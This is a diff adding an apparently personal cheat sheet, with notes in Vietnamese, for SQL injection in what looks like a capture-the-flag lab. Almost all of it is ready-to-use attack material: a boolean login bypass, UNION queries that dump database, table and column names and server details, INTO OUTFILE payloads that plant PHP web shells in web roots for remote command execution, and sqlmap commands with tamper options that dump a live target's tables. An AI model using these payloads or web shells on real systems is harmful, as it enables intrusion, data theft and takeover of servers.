@@ -1,0 +1,75 @@
+LOGIN FORM
+// intruder burp payload sqli=> logic boolean
+
+' or 1 = 1-- -
+
+
+=> search db query form
+
+ boi vi cai logic ngat query => ' ....
+=> suy ra duoc lenh dump dang sau
+
+
+//dump csdl
+' UNION select 1,database(),3,4,5-- -
+
+
+//dump bang
+<' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- ->
+
+//dump thuoc tinh
+<cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- ->
+
+
+//Kiem tra thu muc root cua sql 
+' UNION SELECT 1,@@datadir,3,4,5-- -
+// kiem tra he dieu hanh server
+' UNION SELECT 1,@@version_compile_os,@@version_compile_machine,4,5-- -
+
+// thông thường thì ta sẽ xuất ra các thư mục web root (cùng với index.php, index.html)
+
+' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'-- -
+' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4,5 INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
+' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4,5 INTO OUTFILE '/var/www/html/public/shell.php'-- -
+
+
+//Xuat file => RCE
+cn' union select 1,'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',3,4,5 into outfile '/var/www/html/dashboard/cmd.php'-- -
+
+
+
+// TOOL sqlmap
+
+=>> co chuc nang POST gui den sql => kiem tra gio hang van van
+=> check thu xem co loi den sql 
+=> có => sql map
+
+sqlmap -u "http://94.237.57.115:58718/action.php" --data='{"id":"1"}' --batch  --random-agent --tamper=between --schema 
+
+(bỏ batch đi để nếu muốn tìm thêm lỗi)
+//--flush-session để ko luu session
+
+=> co the add thêm --level --risk
+
+
+=> lenh dump
+
+//dump csdl
+sqlmap -u "URL" --dbs --batch
+//dump table
+sqlmap -u "URL" -D CSDL --tables
+//dump cot
+sqlmap -U "URL" -D CSDL -T Bang --columns
+sqlmap -U "URL" -D CSDL -T Bang -C cot =>> hoac --dump
+
+
+// ap dung luon dump
+
+
+sqlmap -u "http://94.237.57.115:58718/action.php" --data='{"id":"1"}' --random-agent --tamper=between --dbs --dump --batch
+
+sqlmap -u "http://94.237.57.115:58718/action.php" --data='{"id":"1"}' --random-agent --tamper=between -D production -T final_flag -C content --dump --batch 
+
+
+
+
